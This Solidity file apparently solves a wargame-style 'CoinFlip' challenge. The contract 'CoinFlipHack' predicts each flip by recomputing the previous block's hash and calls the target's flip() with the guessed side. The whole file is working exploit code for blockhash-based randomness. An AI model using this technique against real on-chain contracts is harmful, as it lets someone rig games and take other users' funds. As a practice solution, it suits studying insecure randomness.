// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './CoinFlip.sol';

contract CoinFlipHack {
	CoinFlip coinflipContract;
	uint256 factor;

	constructor(address toHack, uint256 _factor) {
		coinflipContract = CoinFlip(toHack);
		factor = _factor;
	}

	function play() public {
    	uint256 blockValue = uint256(blockhash(block.number - 1));
    	uint256 coinFlip = blockValue / factor;
    	bool side = coinFlip == 1 ? true : false;
		coinflipContract.flip(side);
	}
}

